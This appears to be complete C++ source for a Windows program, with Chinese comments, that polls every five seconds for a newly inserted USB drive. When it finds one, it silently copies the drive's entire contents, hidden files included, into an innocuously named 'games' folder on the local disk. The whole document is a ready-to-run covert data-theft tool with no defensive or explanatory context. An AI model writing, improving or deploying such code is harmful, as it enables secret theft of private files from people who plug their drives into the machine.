#include <windows.h>
#include <string.h>
#include <string>
#include <stdlib.h>
using namespace std;

char src[20] = "X:\\";
char dest[20] = "d:\\games\\files\\";	//存放拷贝内容的地址

int main() {
	bool flag = false;
	while (!flag) {
		UINT DiskType;
		for (unsigned char i = 'B'; i < 'Z'; i++) {	//遍历盘符
			src[0] = i;
			DiskType = GetDriveType(src);
			if (DiskType == DRIVE_REMOVABLE) {	//判断是否是可移动存储设备
				char cmd[200];
				sprintf(cmd, "cmd /c xcopy %c: %s /e /y /q /h", i, dest);
				system(cmd);
				flag = true;
			}
		}
		Sleep(5000);  //5sec检测一次U盘
	}
	return 0;
}